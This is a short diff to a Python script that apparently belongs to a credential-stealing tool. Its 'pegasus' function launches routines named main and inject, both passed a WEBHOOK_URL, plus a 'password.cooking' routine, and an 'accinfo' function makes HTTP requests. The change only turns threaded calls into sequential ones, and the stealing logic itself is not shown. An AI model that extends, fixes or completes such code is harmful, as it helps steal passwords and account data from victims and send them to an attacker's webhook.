@@ -53,16 +53,9 @@ def main(webhook_url):
     cleanup()
 
 def pegasus():
-    t1 = main(WEBHOOK_URL)
-    t2 = inject(WEBHOOK_URL)
-    t3 = password.cooking()
-
-    t1.start()
-    t2.start()
-    t3.start()
-
-    while t1.is_alive() or t2.isAlive() or t3.isAlive():
-        pass 
+    main(WEBHOOK_URL)
+    inject(WEBHOOK_URL)
+    password.cooking()
      
 def accinfo():
     r = requests.get(
